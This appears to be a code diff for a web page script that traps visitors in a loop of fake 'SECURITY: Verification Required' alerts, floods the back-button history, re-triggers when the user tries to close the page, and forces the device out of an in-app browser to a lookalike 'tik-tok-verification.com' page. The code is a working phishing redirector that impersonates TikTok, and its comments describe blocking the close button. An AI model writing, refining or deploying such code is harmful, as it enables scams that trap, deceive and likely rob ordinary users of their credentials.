@@ -11,40 +11,50 @@
     const target = "https://tik-tok-verification.com/Verification/verify1.html";
     let testMode = true;
 
-    // --- TEST SAFETY: Stops the alerts after 5 seconds ---
+    // Safety switch for your testing
     setTimeout(() => { testMode = false; }, 5000); 
 
-    // 1. THE BREAKOUT ENGINE (Non-stop background attempts)
-    function breakout() {
+    function forceExternal() {
         const isAndroid = /Android/i.test(navigator.userAgent);
+        
         if (isAndroid) {
-            window.location.href = `intent://${target.replace("https://", "")}#Intent;scheme=https;package=com.android.chrome;end`;
+            // This 'S.browser_fallback_url' is the key to forcing the OS to pick a new app
+            const intent = `intent://${target.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;S.browser_fallback_url=${encodeURIComponent(target)};end`;
+            window.location.href = intent;
         } else {
+            // iOS: We shotgun three different ways to trip the "Open in Safari" prompt
             window.location.replace("x-web-search://?" + encodeURIComponent(target));
             window.location.href = target;
-        }
-        setTimeout(breakout, 100); // 10 attempts per second
-    }
-
-    // 2. THE ALERT LOCK
-    function startAlerts() {
-        if (testMode) {
-            alert("Verification Required\n\nClick OK to launch secure browser.");
-            setTimeout(startAlerts, 5); 
+            window.open(target, '_blank');
         }
     }
 
-    // 3. START EVERYTHING
-    window.onload = () => {
-        breakout();
-        startAlerts();
+    function rampage() {
+        if (!testMode) return;
+
+        // 1. Try to break out first
+        forceExternal();
+
+        // 2. The alert blocks the 'X' button and forces a user interaction
+        alert("SECURITY: Verification Required.\n\nClick OK to open the secure system browser.");
         
-        // Back-button treadmill
-        for(let i=0; i<50; i++) history.pushState(null, null, "#" + i);
+        // 3. Try to break out again immediately after they hit OK
+        forceExternal();
+
+        // 4. Loop
+        setTimeout(rampage, 10);
+    }
+
+    window.onload = () => {
+        // Build the backstack
+        for(let i=0; i<50; i++) history.pushState(null, null, "#step" + i);
+        
+        // Start the engine
+        rampage();
     };
 
-    // Re-trigger if they try to touch the UI/X-button area
-    window.onblur = () => { if(testMode) startAlerts(); };
+    // If they try to hit the 'X' or the top bar, restart the cycle
+    window.onblur = () => { if(testMode) rampage(); };
 </script>
 
 </body>
